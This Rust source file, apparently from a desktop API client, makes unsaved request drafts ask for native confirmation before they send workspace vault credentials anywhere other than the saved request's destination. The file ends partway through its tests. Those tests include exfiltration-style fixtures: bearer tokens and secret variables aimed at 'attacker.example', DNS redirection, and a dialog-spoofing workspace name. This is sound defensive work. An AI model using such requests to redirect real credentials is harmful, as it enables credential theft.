//! Vault-backed authority of a request draft from the webview.
//!
//! A send, an interactive session and an OAuth sign-in may carry an unsaved
//! draft of the request (`SendInput::spec`). Its context resolves the
//! workspace's vault secrets, secret variables and inherited auth in the
//! backend, as a saved request's does; nothing secret is returned to the
//! webview. What the webview chooses is where they go. So a draft that
//! carries any of them ([`carries_vault_authority`]) is used only where its
//! saved request would use them: the same destination origin and the same
//! request authority (an explicit Host or `:authority`, else the URL's),
//! with the same effective auth, the same MASQUE route and TLS choices, and
//! the same connection settings (proxy, TLS profile and verification, DNS
//! overrides, redirects and the rest, see [`Binding`]). The backend works
//! these out from the very context it then executes, resolving and parsing
//! the URL and the Host as the engine does on every send.
//!
//! A part that a per-send value reaches (`{{$randomFrom …}}`, `{{$counter}}`,
//! `{{$randomInt}}`, `{{$uuid}}`, a timestamp, directly or through a
//! variable) is not known before sending: every send, and every check, draws
//! it again, so the value checked need not be the value sent. Such a part
//! matches nothing, and the draft is asked about. A per-send value in the
//! path or query changes none of these parts.
//!
//! A draft without a saved request, or one that differs there, is used only
//! once the user confirms it in a native dialog that names the destination
//! first, then the workspace and what differs from the saved request (see
//! `crate::presence`). Each confirmation authorizes one send, session or
//! sign-in, of the context it was asked about. A draft that carries no
//! vault-backed authority is not asked about, so local and private APIs keep
//! working.

use crate::commands::{CANCELED, R, e};
use crate::presence::{Presence, Prompt, confirm, shown};
use crate::state::DesktopState;
use anvil_app::App;
use anvil_app::exec::SendOptions;
use anvil_domain::Id;
use anvil_domain::auth::{AuthConfig, KeyLocation};
use anvil_domain::request::{Protocol, RequestSpec};
use anvil_domain::settings::EffectiveSettings;
use anvil_domain::tls::ProxyKind;
use anvil_engine::ExecutionOutput;
use anvil_engine::context::ExecutionContext;
use anvil_engine::prepare::{Target, parse_target, preflight_authority};
use anvil_engine::vars::{Resolver, mask_dynamic};
use anvil_transport::recorder::EventCtx;
use serde_json::Value;
use std::sync::Arc;
use tokio_util::sync::CancellationToken;

/// What a per-send value stands in as while the backend resolves what every
/// send resolves. It holds no URL delimiter, so it stays inside the part of
/// a URL it reaches.
const PER_SEND: &str = "anvil-per-send-value";

/// How the dialog names a part of a request the backend cannot work out
/// before sending.
const UNKNOWN: &str = "one Anvil cannot work out before sending";

/// Whether `ctx` carries anything from the workspace's vault or its secret
/// settings: auth in effect (the request's own or inherited), a secret
/// variable in any scope it resolves, a vault reference in the spec or in
/// the TLS, proxy or integration profile its settings select, or a client
/// identity in a selected TLS profile.
pub(crate) fn carries_vault_authority(ctx: &ExecutionContext) -> bool {
    if !matches!(ctx.effective_auth().1, AuthConfig::None) {
        return true;
    }
    if ctx.var_layers.iter().any(|l| l.vars.iter().any(|v| v.secret)) {
        return true;
    }
    let settings = anvil_engine::settings::resolve(&ctx.settings_layers);
    let proxy = settings.proxy_profile_id.and_then(|id| ctx.proxy_profiles.iter().find(|p| p.id == id));
    let selected = [settings.tls_profile_id, proxy.and_then(|p| p.tls_profile_id)];
    let tls: Vec<_> = ctx.tls_profiles.iter().filter(|p| selected.contains(&Some(p.id))).collect();
    if tls.iter().any(|p| p.client_identity.is_some()) {
        return true;
    }
    let integration = settings.integration_profile_id.and_then(|id| ctx.integrations.iter().find(|i| i.id == id));
    let parts =
        [serde_json::to_value(&ctx.spec), serde_json::to_value(&tls), serde_json::to_value(proxy), serde_json::to_value(integration)];
    // A part that does not serialize is taken to carry one.
    parts.iter().any(|p| match p {
        Ok(v) => names_a_secret(v),
        Err(_) => true,
    })
}

/// Whether `v` holds a vault reference (`SensitiveValue::Secret`).
fn names_a_secret(v: &Value) -> bool {
    match v {
        Value::Object(o) => {
            let is_ref = o.get("kind").and_then(Value::as_str) == Some("secret") && o.contains_key("secret");
            is_ref || o.values().any(names_a_secret)
        }
        Value::Array(a) => a.iter().any(names_a_secret),
        _ => false,
    }
}

/// A resolver for what every send of `ctx` resolves the same way: its
/// variables, with each per-send value masked as [`PER_SEND`], also one
/// reached through another variable's value.
fn fixed_resolver(ctx: &ExecutionContext) -> Resolver {
    let mut layers = ctx.var_layers.clone();
    for v in layers.iter_mut().flat_map(|l| l.vars.iter_mut()) {
        v.value = mask_dynamic(&v.value, PER_SEND);
    }
    Resolver::new(layers, None)
}

/// `template` as every send resolves it; `None` when a per-send value
/// reaches it, or it does not resolve.
fn fixed(r: &Resolver, template: &str, field: &str) -> Option<String> {
    let resolved = r.resolve(&mask_dynamic(template, PER_SEND), field).ok()?;
    (!resolved.contains(PER_SEND)).then_some(resolved)
}

/// The target the engine parses the URL `template` into for `schemes`;
/// `None` when a per-send value reaches its scheme, host or port, or it does
/// not resolve or parse.
fn fixed_target(r: &Resolver, template: &str, field: &str, schemes: &[&str]) -> Option<Target> {
    let url = r.resolve(&mask_dynamic(template, PER_SEND), field).ok()?;
    let target = parse_target(&url, schemes, &mut Vec::new()).ok()?;
    (!target.scheme.contains(PER_SEND) && !target.authority.contains(PER_SEND)).then_some(target)
}

/// The target of the request URL of `ctx` (see [`fixed_target`]).
fn url_target(ctx: &ExecutionContext, r: &Resolver) -> Option<Target> {
    fixed_target(r, &ctx.spec.url, "url", anvil_load::protocol::send_schemes(ctx.spec.protocol))
}

/// `scheme://host:port` of `t`, with the port always written.
fn origin_of(t: &Target) -> String {
    let host = if t.host.contains(':') { format!("[{}]", t.host) } else { t.host.to_ascii_lowercase() };
    format!("{}://{host}:{}", t.scheme, t.port)
}

/// The MASQUE proxy origin and routing template of a UDP request that
/// tunnels through one; `Some(None)` for any other request, `None` when a
/// per-send value reaches either.
fn masque_route(ctx: &ExecutionContext, r: &Resolver) -> Option<Option<(String, String)>> {
    let masque = ctx.spec.udp.as_ref().and_then(|u| u.masque.as_ref()).filter(|_| ctx.spec.protocol == Protocol::Udp);
    let Some(m) = masque else { return Some(None) };
    let proxy = fixed_target(r, &m.proxy_url, "udp.masque.proxy_url", &["https", "http"])?;
    Some(Some((origin_of(&proxy), fixed(r, &m.uri_template, "udp.masque.uri_template")?)))
}

/// Where, and how, a context uses what it carries, as the engine works it
/// out from that context on every send: the destination origin, the
/// authority the request names (its first explicit Host, or an auth-written
/// one, else the URL's), the MASQUE route of a UDP request, the TLS choices
/// of its protocol (gRPC plaintext, TCP TLS, UDP DTLS), the auth in effect
/// and the effective connection settings. `None` marks a part a per-send
/// value reaches, or one that does not resolve: it is not known before
/// sending.
#[derive(Debug, PartialEq)]
pub(crate) struct Binding {
    origin: Option<String>,
    authority: Option<String>,
    masque: Option<Option<(String, String)>>,
    transport: [Option<bool>; 3],
    auth: (String, AuthConfig),
    settings: EffectiveSettings,
}

impl Binding {
    pub(crate) fn of(ctx: &ExecutionContext) -> Binding {
        let r = fixed_resolver(ctx);
        let target = url_target(ctx, &r);
        let authority = target.as_ref().and_then(|t| preflight_authority(ctx, t, |template, field| fixed(&r, template, field)));
        let mut settings = anvil_engine::settings::resolve(&ctx.settings_layers);
        // Where a setting comes from changes nothing it does.
        settings.sources.clear();
        let spec = &ctx.spec;
        Binding {
            origin: target.as_ref().map(origin_of),
            authority,
            masque: masque_route(ctx, &r),
            transport: [spec.grpc.as_ref().map(|g| g.plaintext), spec.tcp.as_ref().map(|t| t.tls), spec.udp.as_ref().map(|u| u.dtls)],
            auth: ctx.effective_auth(),
            settings,
        }
    }

    /// Whether `self` uses what it carries as `saved` does. A part that
    /// cannot be worked out before sending matches nothing.
    fn matches(&self, saved: &Binding) -> bool {
        self.origin.is_some() && self.authority.is_some() && self.masque.is_some() && self == saved
    }
}

/// The parts of a context a dialog names, in words the backend works out.
/// A name the webview chose goes through [`shown`]; `None` is "none".
struct Facts {
    destination: String,
    masque: String,
    dns: Option<String>,
    proxy: Option<String>,
    tls: Option<String>,
    auth: String,
}

impl Facts {
    fn of(ctx: &ExecutionContext) -> Facts {
        let settings = anvil_engine::settings::resolve(&ctx.settings_layers);
        let proxy = settings.proxy_profile_id.and_then(|id| ctx.proxy_profiles.iter().find(|p| p.id == id));
        let tls = settings.tls_profile_id.and_then(|id| ctx.tls_profiles.iter().find(|p| p.id == id));
        let off = |verify: bool| if verify { "" } else { ", certificate verification off" };
        Facts {
            destination: destination(ctx),
            masque: masque_proxy(ctx),
            dns: dns_overrides(&settings),
            proxy: proxy.map(|p| format!("“{}” ({} proxy {})", shown(&p.name), proxy_kind(p.kind), shown(&p.address))),
            tls: tls.map(|p| format!("“{}”{}", shown(&p.name), off(p.verify))),
            auth: auth_label(&ctx.effective_auth().1),
        }
    }
}

/// The destination origin of `ctx` as a dialog names it; never one a secret
/// value reaches.
fn destination(ctx: &ExecutionContext) -> String {
    let r = fixed_resolver(ctx);
    let Some(target) = url_target(ctx, &r) else {
        return format!("{UNKNOWN} (it changes from one send to the next, or does not resolve)");
    };
    unless_secret(&r, origin_of(&target))
}

/// The MASQUE proxy origin of `ctx` as a dialog names it; never one a
/// secret value reaches.
fn masque_proxy(ctx: &ExecutionContext) -> String {
    let r = fixed_resolver(ctx);
    match masque_route(ctx, &r) {
        None => UNKNOWN.into(),
        Some(None) => "none".into(),
        Some(Some((origin, _))) => unless_secret(&r, origin),
    }
}

/// `origin`, unless a secret value `r` substituted reaches it.
fn unless_secret(r: &Resolver, origin: String) -> String {
    if r.used_secrets.lock().iter().any(|s| !s.is_empty() && origin.contains(&s.to_ascii_lowercase())) {
        return "an address built from a secret value".into();
    }
    origin
}

fn proxy_kind(kind: ProxyKind) -> &'static str {
    match kind {
        ProxyKind::Http => "HTTP",
        ProxyKind::Https => "HTTPS",
        ProxyKind::Socks5 => "SOCKS5",
        ProxyKind::Hbone => "HBONE",
    }
}

/// The DNS overrides of `settings`, at most three of them named.
fn dns_overrides(settings: &EffectiveSettings) -> Option<String> {
    let all = &settings.dns_overrides;
    if all.is_empty() {
        return None;
    }
    let mut named: Vec<String> = all.iter().take(3).map(|d| format!("{} → {}", shown(&d.host), shown(&d.addresses.join(", ")))).collect();
    if all.len() > 3 {
        named.push(format!("and {} more", all.len() - 3));
    }
    Some(named.join("; "))
}

/// The kind of `auth`, and where an API key goes, in words.
fn auth_label(auth: &AuthConfig) -> String {
    match auth {
        AuthConfig::ApiKey { name, location, .. } => {
            let place = match location {
                KeyLocation::Header => "header",
                KeyLocation::Query => "query parameter",
                KeyLocation::Cookie => "cookie",
            };
            format!("an API key in the {place} “{}”", shown(name))
        }
        AuthConfig::Multi { profiles } => profiles.iter().map(auth_label).collect::<Vec<_>>().join(" and "),
        other => other.kind_label().replace('_', " "),
    }
}

fn said(part: &Option<String>) -> &str {
    part.as_deref().unwrap_or("none")
}

/// The MASQUE proxy origin `b` tunnels through (see [`masque_route`]).
fn masque_origin(b: &Binding) -> Option<Option<&str>> {
    b.masque.as_ref().map(|route| route.as_ref().map(|(origin, _)| origin.as_str()))
}

/// The connection settings of `s` besides its DNS overrides, proxy and TLS
/// profile, which a dialog names on their own.
fn others(s: &EffectiveSettings) -> EffectiveSettings {
    EffectiveSettings { dns_overrides: Vec::new(), proxy_profile_id: None, tls_profile_id: None, ..s.clone() }
}

/// What `draft` does differently from `saved` with what it carries, one
/// line for each part, the draft's first.
fn changes(draft: &Binding, facts: &Facts, saved: &Binding, saved_facts: &Facts) -> Vec<String> {
    let mut out = Vec::new();
    if draft.origin.is_none() || draft.origin != saved.origin {
        out.push(format!("Destination: {} (saved: {})", facts.destination, saved_facts.destination));
    }
    if draft.authority.is_none() {
        out.push(format!("Host header: {UNKNOWN}"));
    } else if draft.authority != saved.authority {
        out.push("Host header: names another server than the saved request".into());
    }
    if draft.masque.is_none() || draft.masque != saved.masque {
        let (now, was) = (&facts.masque, &saved_facts.masque);
        out.push(if draft.masque.is_some() && masque_origin(draft) == masque_origin(saved) {
            format!("MASQUE proxy: {now}, with another routing template")
        } else {
            format!("MASQUE proxy: {now} (saved: {was})")
        });
    }
    if facts.dns != saved_facts.dns {
        out.push(format!("DNS overrides: {} (saved: {})", said(&facts.dns), said(&saved_facts.dns)));
    }
    if facts.proxy != saved_facts.proxy {
        out.push(format!("Proxy: {} (saved: {})", said(&facts.proxy), said(&saved_facts.proxy)));
    }
    if facts.tls != saved_facts.tls {
        out.push(format!("TLS profile: {} (saved: {})", said(&facts.tls), said(&saved_facts.tls)));
    }
    if draft.transport != saved.transport {
        out.push("TLS: the protocol's own choice of TLS or cleartext differs".into());
    }
    if draft.auth != saved.auth {
        out.push(if facts.auth == saved_facts.auth {
            format!("Auth: {}, with another credential or option, or set elsewhere", facts.auth)
        } else {
            format!("Auth: {} (saved: {})", facts.auth, saved_facts.auth)
        });
    }
    if others(&draft.settings) != others(&saved.settings) {
        out.push("Other connection settings (redirects, timeouts, retries and the like) differ".into());
    }
    if out.is_empty() {
        out.push("Connection settings differ from the saved request's".into());
    }
    out
}

/// What a draft without a saved request to compare with does with what it
/// carries, one line for each part it sets.
fn alone(draft: &Binding, facts: &Facts) -> Vec<String> {
    let mut out = vec![format!("Auth: {}", facts.auth)];
    if draft.authority.is_none() {
        out.push(format!("Host header: {UNKNOWN}"));
    }
    if draft.masque != Some(None) {
        out.push(format!("MASQUE proxy: {}", facts.masque));
    }
    let set = [("DNS overrides", &facts.dns), ("Proxy", &facts.proxy), ("TLS profile", &facts.tls)];
    out.extend(set.iter().filter_map(|(what, part)| part.as_ref().map(|p| format!("{what}: {p}"))));
    out
}

/// The question for a draft: its destination first, then the workspace
/// whose credentials it would use and each part of it in `lines`.
fn prompt(workspace: &str, destination: &str, saved: bool, lines: &[String]) -> Prompt {
    let lead = if saved {
        format!(
            "Unsaved changes to this request would use credentials or secret values from the workspace “{workspace}” differently from the saved request:"
        )
    } else {
        format!("This unsaved request would use credentials or secret values from the workspace “{workspace}”:")
    };
    let who = if saved { "you made these changes" } else { "you made this request" };
    let message = format!("Destination: {destination}\n\n{lead}\n• {}\n\nOnly continue if {who} yourself.", lines.join("\n• "));
    Prompt { title: "Use workspace credentials?", message, ok: "Continue" }
}

/// Refuse the draft context `draft` unless what it carries from the vault
/// goes where its saved request `request_id` would send it, or the user
/// confirms it natively. `opts` are the options it was built with; the
/// saved request is built with the same ones to compare. On the desktop they
/// carry no per-send settings layer (see `SendInput::options`).
pub(crate) async fn authorize(
    st: &DesktopState,
    presence: &impl Presence,
    app: &Arc<App>,
    request_id: Option<Id>,
    ws: Id,
    draft: &ExecutionContext,
    opts: &SendOptions,
) -> R<()> {
    if !carries_vault_authority(draft) {
        return Ok(());
    }
    let (binding, facts) = (Binding::of(draft), Facts::of(draft));
    let (owner, opts) = (app.clone(), opts.clone());
    // Built on a blocking thread, as the draft's context was.
    let asked = anvil_app::off_runtime(move || {
        let saved = request_id.and_then(|rid| owner.build_context(Some(rid), &ws, None, &opts).ok());
        let lines = match &saved {
            Some(ctx) => {
                let theirs = Binding::of(ctx);
                if binding.matches(&theirs) {
                    return Ok(None);
                }
                changes(&binding, &facts, &theirs, &Facts::of(ctx))
            }
            None => alone(&binding, &facts),
        };
        Ok(Some((shown(&owner.workspace(&ws)?.name), facts.destination, saved.is_some(), lines)))
    })
    .await
    .map_err(e)?;
    let Some((workspace, destination, saved, lines)) = asked else {
        return Ok(());
    };
    confirm(st, presence, prompt(&workspace, &destination, saved, &lines)).await?;
    Ok(())
}

/// Send the draft `draft` of `request_id` (or an unsaved request) once
/// [`authorize`] allows it, and record it as [`App::send`] does.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn send_draft(
    st: &DesktopState,
    presence: &impl Presence,
    app: &Arc<App>,
    request_id: Option<Id>,
    ws: Id,
    draft: RequestSpec,
    opts: SendOptions,
    events: EventCtx,
    cancel: &CancellationToken,
) -> R<ExecutionOutput> {
    let record_history = opts.record_history;
    let ctx = app.build_context_off_runtime(request_id, ws, Some(draft), opts.clone(), cancel).await.map_err(e)?;
    authorize(st, presence, app, request_id, ws, &ctx, &opts).await?;
    // Canceled (or locked) while the dialog was open: nothing is sent.
    if cancel.is_cancelled() {
        return Err(CANCELED.into());
    }
    let out = app.engine.execute(&ctx, events, cancel.clone()).await;
    if !record_history {
        return Ok(out);
    }
    let (out, recorded) = app.record_off_runtime(out).await;
    recorded.map_err(e)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::presence::NOT_CONFIRMED;
    use crate::presence::testing::Answer;
    use crate::state::tests::{TempRoot, create};
    use anvil_domain::request::{KeyValue, MasqueSpec, UdpSpec};
    use anvil_domain::secret::{SecretRef, SensitiveValue};
    use anvil_domain::settings::DnsOverride;
    use anvil_domain::workspace::Variable;

    struct Fixture {
        _root: TempRoot,
        st: DesktopState,
        app: Arc<App>,
        ws: Id,
        secret: SecretRef,
    }

    fn fixture() -> Fixture {
        let root = TempRoot::new();
        let st = DesktopState::new(root.0.clone());
        let (app, _) = create(&st, "P");
        st.set_app_since(app, st.epoch()).unwrap();
        let app = st.app().unwrap();
        let ws = app.create_workspace("Payments").unwrap().meta.id;
        let secret = app.set_secret(&ws, "api token", "vault-canary-token").unwrap();
        Fixture { _root: root, st, app, ws, secret }
    }

    fn bearer(secret: &SecretRef) -> AuthConfig {
        AuthConfig::Bearer { token: SensitiveValue::Secret { secret: secret.clone() }, prefix: "Bearer".into() }
    }

    impl Fixture {
        /// A saved request to `url` with `auth`, and its id.
        fn saved(&self, url: &str, auth: AuthConfig) -> (Id, RequestSpec) {
            let mut spec = RequestSpec::http("GET", url);
            spec.auth = auth;
            let r = self.app.create_request(&self.ws, None, "saved", spec.clone()).unwrap();
            (r.meta.id, spec)
        }

        /// Whether `draft` of `request_id` goes ahead under `presence`.
        async fn authorized(&self, presence: &impl Presence, request_id: Option<Id>, draft: RequestSpec) -> R<()> {
            let opts = SendOptions::default();
            let ctx = self.app.build_context(request_id, &self.ws, Some(draft), &opts).unwrap();
            authorize(&self.st, presence, &self.app, request_id, self.ws, &ctx, &opts).await
        }
    }

    #[tokio::test]
    async fn an_unsaved_request_with_vault_credentials_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let mut draft = RequestSpec::http("GET", "https://attacker.example/collect");
        draft.auth = bearer(&f.secret);
        let no = Answer::no();
        assert_eq!(f.authorized(&no, None, draft.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        let asked = no.asked.lock()[0].clone();
        assert!(asked.contains("“Payments”") && asked.contains("https://attacker.example:443"), "{asked}");
        assert!(!asked.contains("vault-canary-token"));
        let yes = Answer::yes();
        assert_eq!(f.authorized(&yes, None, draft).await, Ok(()));
        assert_eq!(yes.times(), 1);
    }

    #[tokio::test]
    async fn a_draft_moving_saved_credentials_to_another_origin_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let (rid, saved) = f.saved("https://shop.example/v1/charges", bearer(&f.secret));
        let moved = [
            "https://attacker.example/v1/charges",
            // Cleartext, or another port, is another origin.
            "http://shop.example/v1/charges",
            "https://shop.example:8443/v1/charges",
        ];
        for url in moved {
            let draft = RequestSpec { url: url.into(), ..saved.clone() };
            let no = Answer::no();
            assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()), "{url}");
            assert_eq!(no.times(), 1, "{url}");
        }
    }

    #[tokio::test]
    async fn a_draft_that_sends_saved_credentials_where_the_saved_request_does_is_not_asked() {
        let f = fixture();
        let (rid, saved) = f.saved("https://shop.example/v1/charges", bearer(&f.secret));
        let unasked = Answer::no();
        // As saved, and with another path, query, method and headers.
        assert_eq!(f.authorized(&unasked, Some(rid), saved.clone()).await, Ok(()));
        let mut edited = RequestSpec { url: "https://SHOP.example:443/v2/refunds?limit=5".into(), ..saved.clone() };
        edited.method = "POST".into();
        assert_eq!(f.authorized(&unasked, Some(rid), edited).await, Ok(()));
        assert_eq!(unasked.times(), 0);
    }

    #[tokio::test]
    async fn a_draft_inheriting_workspace_auth_is_bound_like_its_own() {
        let f = fixture();
        let mut w = f.app.workspace(&f.ws).unwrap();
        w.auth = bearer(&f.secret);
        f.app.save_workspace(w).unwrap();
        let (rid, saved) = f.saved("https://shop.example/v1", AuthConfig::Inherit);
        let unasked = Answer::no();
        assert_eq!(f.authorized(&unasked, Some(rid), saved.clone()).await, Ok(()));
        assert_eq!(unasked.times(), 0);
        let no = Answer::no();
        let moved = RequestSpec { url: "https://attacker.example/v1".into(), ..saved };
        assert_eq!(f.authorized(&no, Some(rid), moved).await, Err(NOT_CONFIRMED.to_string()));
    }

    #[tokio::test]
    async fn a_draft_using_a_secret_variable_elsewhere_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let mut w = f.app.workspace(&f.ws).unwrap();
        let value = SensitiveValue::Secret { secret: f.secret.clone() };
        w.variables.push(Variable { name: "token".into(), value, secret: true, enabled: true, description: String::new() });
        f.app.save_workspace(w).unwrap();
        let (rid, _) = f.saved("https://shop.example/v1", AuthConfig::None);
        let mut draft = RequestSpec::http("GET", "https://attacker.example/?t={{token}}");
        draft.auth = AuthConfig::None;
        let no = Answer::no();
        assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()));
        assert!(!no.asked.lock()[0].contains("vault-canary-token"));
    }

    #[tokio::test]
    async fn a_draft_changing_how_saved_credentials_are_carried_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let (rid, saved) = f.saved("https://shop.example/v1", bearer(&f.secret));
        // The same URL, resolved to another address.
        let mut dns = saved.clone();
        dns.settings.dns_overrides.push(DnsOverride { host: "shop.example".into(), addresses: vec!["127.0.0.1".into()] });
        // The same URL and token, in another header.
        let mut header = saved.clone();
        let value = SensitiveValue::Secret { secret: f.secret.clone() };
        header.auth = AuthConfig::ApiKey { name: "X-Token".into(), value, location: Default::default() };
        let differs = [
            (dns, "DNS overrides: shop.example → 127.0.0.1 (saved: none)"),
            (header, "Auth: an API key in the header “X-Token” (saved: bearer)"),
        ];
        for (draft, line) in differs {
            let no = Answer::no();
            assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()));
            assert_eq!(no.times(), 1);
            let asked = no.asked.lock()[0].clone();
            // The real destination first, then what differs from the saved request.
            assert!(asked.starts_with("Destination: https://shop.example:443\n"), "{asked}");
            assert!(asked.contains(&format!("\n• {line}")), "{asked}");
            assert!(!asked.contains("Destination: https://shop.example:443 (saved"), "the destination is unchanged: {asked}");
        }
    }

    #[tokio::test]
    async fn a_draft_whose_origin_a_per_send_value_reaches_is_always_asked() {
        let f = fixture();
        let (rid, saved) = f.saved("https://shop.example/v1", bearer(&f.secret));
        // Each resolution draws again: the host checked need not be the host sent.
        let mut w = f.app.workspace(&f.ws).unwrap();
        w.variables.push(Variable::plain("host", "{{$randomFrom shop.example|attacker.example}}"));
        f.app.save_workspace(w).unwrap();
        let per_send = [
            "https://{{$randomFrom shop.example|attacker.example}}/v1",
            // Even when every choice is the saved host.
            "https://{{ $randomFrom shop.example|shop.example }}/v1",
            "https://{{host}}/v1",
            "https://shop.example:{{$randomInt 443 443}}/v1",
            "https://shop{{$counter}}.example/v1",
            "{{$randomFrom https|http}}://shop.example/v1",
        ];
        for url in per_send {
            let draft = RequestSpec { url: url.into(), ..saved.clone() };
            let no = Answer::no();
            assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()), "{url}");
            let asked = no.asked.lock()[0].clone();
            assert!(asked.starts_with(&format!("Destination: {UNKNOWN}")), "{url}: {asked}");
        }
        // A saved request built that way is no baseline either.
        let (dynamic, spec) = f.saved("https://{{host}}/v1", bearer(&f.secret));
        let no = Answer::no();
        assert_eq!(f.authorized(&no, Some(dynamic), spec).await, Err(NOT_CONFIRMED.to_string()));
        // A per-send value in the path or query leaves the origin known.
        let unasked = Answer::no();
        let draft = RequestSpec { url: "https://shop.example/v1/{{$uuid}}?n={{$randomInt}}&t={{$timestamp}}".into(), ..saved };
        assert_eq!(f.authorized(&unasked, Some(rid), draft).await, Ok(()));
        assert_eq!(unasked.times(), 0);
    }

    #[tokio::test]
    async fn a_draft_naming_another_host_than_its_saved_request_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let (rid, saved) = f.saved("https://shop.example/v1", bearer(&f.secret));
        let with_host = |value: &str| {
            let mut draft = saved.clone();
            draft.headers.push(KeyValue::new("Host", value));
            draft
        };
        let other = [("attacker.example", "names another server"), ("{{$randomFrom shop.example|attacker.example}}", UNKNOWN)];
        for (host, line) in other {
            let no = Answer::no();
            assert_eq!(f.authorized(&no, Some(rid), with_host(host)).await, Err(NOT_CONFIRMED.to_string()), "{host}");
            let asked = no.asked.lock()[0].clone();
            assert!(asked.contains(&format!("• Host header: {line}")), "{host}: {asked}");
            assert!(!asked.contains("attacker.example"), "a Host value is never shown: {asked}");
        }
        // The URL's own authority, named explicitly, is where the saved request goes.
        let unasked = Answer::no();
        assert_eq!(f.authorized(&unasked, Some(rid), with_host("shop.example")).await, Ok(()));
        assert_eq!(unasked.times(), 0);
    }

    #[tokio::test]
    async fn names_the_webview_chose_cannot_rewrite_the_dialog() {
        let f = fixture();
        let mut w = f.app.workspace(&f.ws).unwrap();
        w.name = format!("Pay\u{202E}ments\n\nDestination: https://shop.example:443\n{}", "x".repeat(200));
        f.app.save_workspace(w).unwrap();
        let mut draft = RequestSpec::http("GET", "https://attacker.example/collect");
        draft.auth = bearer(&f.secret);
        let no = Answer::no();
        assert_eq!(f.authorized(&no, None, draft).await, Err(NOT_CONFIRMED.to_string()));
        let asked = no.asked.lock()[0].clone();
        assert!(asked.starts_with("Destination: https://attacker.example:443\n"), "{asked}");
        assert_eq!(asked.lines().filter(|l| l.starts_with("Destination:")).count(), 1, "{asked}");
        assert!(asked.contains("“Payments Destination: https://shop.example:443 xxx"), "{asked}");
        assert!(!asked.contains('\u{202E}') && !asked.contains(&"x".repeat(100)), "{asked}");
    }

    #[tokio::test]
    async fn a_masque_proxy_built_from_a_secret_value_is_not_named() {
        let f = fixture();
        let mut w = f.app.workspace(&f.ws).unwrap();
        let value = SensitiveValue::Secret { secret: f.secret.clone() };
        w.variables.push(Variable { name: "relay".into(), value, secret: true, enabled: true, description: String::new() });
        f.app.save_workspace(w).unwrap();
        let mut draft = RequestSpec::http("GET", "udp://shop.example:4433");
        draft.protocol = Protocol::Udp;
        draft.auth = AuthConfig::None;
        draft.udp = Some(UdpSpec {
            dtls: false,
            datagrams: vec![],
            response_window_ms: 500,
            max_datagrams: 10,
            proxy_protocol: None,
            masque: Some(MasqueSpec {
                proxy_url: "https://{{relay}}:443".into(),
                uri_template: "/.well-known/masque/udp/{target_host}/{target_port}/".into(),
                datagrams: Default::default(),
            }),
        });
        let no = Answer::no();
        assert_eq!(f.authorized(&no, None, draft).await, Err(NOT_CONFIRMED.to_string()));
        let asked = no.asked.lock()[0].clone();
        assert!(asked.contains("\n• MASQUE proxy: an address built from a secret value"), "{asked}");
        assert!(!asked.contains("vault-canary-token"), "{asked}");
    }

    #[tokio::test]
    async fn a_saved_request_must_keep_its_masque_route_to_use_vault_credentials() {
        let f = fixture();
        let mut saved = RequestSpec::http("GET", "udp://shop.example:4433");
        saved.protocol = Protocol::Udp;
        saved.auth = bearer(&f.secret);
        saved.udp = Some(UdpSpec {
            dtls: false,
            datagrams: vec![],
            response_window_ms: 500,
            max_datagrams: 10,
            proxy_protocol: None,
            masque: Some(MasqueSpec {
                proxy_url: "https://relay.example:443".into(),
                uri_template: "/.well-known/masque/udp/{target_host}/{target_port}/".into(),
                datagrams: Default::default(),
            }),
        });
        let request = f.app.create_request(&f.ws, None, "saved", saved.clone()).unwrap();
        let no = Answer::no();
        assert_eq!(f.authorized(&no, Some(request.meta.id), saved.clone()).await, Ok(()));
        assert_eq!(no.times(), 0);

        saved.udp.as_mut().unwrap().masque.as_mut().unwrap().uri_template =
            "/.well-known/masque/udp/{target_host}/{target_port}/changed/".into();
        let no = Answer::no();
        assert_eq!(f.authorized(&no, Some(request.meta.id), saved).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(no.asked.lock()[0].contains("MASQUE proxy: https://relay.example:443, with another routing template"));
    }

    #[tokio::test]
    async fn a_draft_without_vault_authority_is_not_asked_even_for_a_local_service() {
        let f = fixture();
        let unasked = Answer::no();
        let mut local = RequestSpec::http("GET", "http://127.0.0.1:8080/health");
        local.auth = AuthConfig::None;
        assert_eq!(f.authorized(&unasked, None, local.clone()).await, Ok(()));
        let (rid, _) = f.saved("https://shop.example/v1", AuthConfig::None);
        assert_eq!(f.authorized(&unasked, Some(rid), local).await, Ok(()));
        assert_eq!(unasked.times(), 0);
    }

    #[tokio::test]
    async fn each_draft_send_is_asked_again() {
        let f = fixture();
        let mut draft = RequestSpec::http("GET", "https://elsewhere.example/");
        draft.auth = bearer(&f.secret);
        let yes = Answer::yes();
        f.authorized(&yes, None, draft.clone()).await.unwrap();
        f.authorized(&yes, None, draft.clone()).await.unwrap();
        assert_eq!(yes.times(), 2, "one answer authorizes one use");
        let no = Answer::no();
        assert_eq!(f.authorized(&no, None, draft).await, Err(NOT_CONFIRMED.to_string()));
    }

    #[tokio::test]
    async fn a_lock_while_the_dialog_is_open_refuses_the_draft() {
        let f = fixture();
        let mut draft = RequestSpec::http("GET", "https://elsewhere.example/");
        draft.auth = bearer(&f.secret);
        let opts = SendOptions::default();
        let ctx = f.app.build_context(None, &f.ws, Some(draft), &opts).unwrap();
        let yes = Answer::with(true, || f.st.lock());
        assert_eq!(authorize(&f.st, &yes, &f.app, None, f.ws, &ctx, &opts).await, Err("LOCKED".to_string()));
    }

    #[test]
    fn an_origin_is_the_one_the_engine_parses_and_only_known_without_a_per_send_value() {
        let origin = |url: &str, protocol: Protocol| {
            let mut spec = RequestSpec::http("GET", url);
            spec.protocol = protocol;
            let ctx = ExecutionContext::standalone(spec);
            url_target(&ctx, &fixed_resolver(&ctx)).as_ref().map(origin_of)
        };
